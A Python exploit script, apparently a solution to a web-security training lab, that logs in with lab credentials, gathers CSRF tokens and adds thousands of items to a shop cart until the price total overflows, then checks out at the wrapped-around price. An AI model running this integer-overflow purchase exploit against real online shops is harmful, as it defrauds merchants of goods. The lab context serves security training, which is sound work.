#!/bin/python3

import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={"http":"http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# GET /login
    # Collect CSRF token
# POST /login
    # csrf=eyQHMEzagNizdmmjK3ygtSTXfnp9Dknl&username=wiener&password=peter

# POST /cart
    # productId=3&redir=PRODUCT&quantity=1
# GET /cart
    # Collect CSRF token
# POST /cart/checkout
    # csrf=dp3bS12kinLdsKYHOax1raAbimL7S2Qt
# GET /cart/order-confirmation?order-confirmed=true

# TODO: Get CSRF from login page
def getloginCSRF(res):
    content = res.text
    soup = BeautifulSoup(content,"html.parser")
    csrf= soup.find(attrs={"type":"hidden"})
    return csrf['value']


# TODO: Login
def login():
    s = requests.Session()
    res = s.get(f"{HOST}login", verify=False,proxies=proxies)
    csrfToken = getloginCSRF(res)
    login = s.post(f"{HOST}login",verify=False,proxies=proxies, data={'csrf':csrfToken,'username':'wiener','password':'peter'})
    return s

# TODO: Check cart total
def check_cart_total(response):
    soup = BeautifulSoup(response.text,"html.parser")
    total = soup.findAll("th")[5]
    return total.text

# TODO: Add to cart
def add_product(session,prodId,NUM):
    s = session
    res = s.post(f"{HOST}cart",verify=False,proxies=proxies,data={"productId":prodId,"redir":"CART","quantity":NUM})
    # TODO: Check if we've overflowed
    return res, s

def checkout(session):
    s = session
    res = s.get(f"{HOST}cart", verify=False, proxies=proxies)
    # print(res.text)
    soup = BeautifulSoup(res.text,"html.parser")
    csrf = soup.find(attrs={'name':"csrf"})
    token = csrf['value']
    s.post(f"{HOST}cart/checkout", verify=False, proxies=proxies,data={'csrf':token})
    


if __name__ == "__main__":
    try:
        HOST = sys.argv[1].strip()
        # print(sys.argv[1])
    except IndexError:
        print("[-] Error: You're missing the URL!!")
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        exit(-1)

    loggedIn = login()
    total_num = 0
    while total_num < 32076:
        res,s = add_product(loggedIn,1,99)
        # checkout(add99)
        total_num += 99
        current_cart = check_cart_total(res)
        print(f"After {total_num} jackets our cart is at {current_cart}")
    res, s = add_product(loggedIn,1,47)
    total_num += 47
    res, s = add_product(s,3,42)
    current_cart = check_cart_total(res)
    print(f"After {total_num} jackets and 42 eye projectors, our cart is at {current_cart}")
    print("Checking out now..")
    print(f"Cart is at: {current_cart}")
    checkout(s)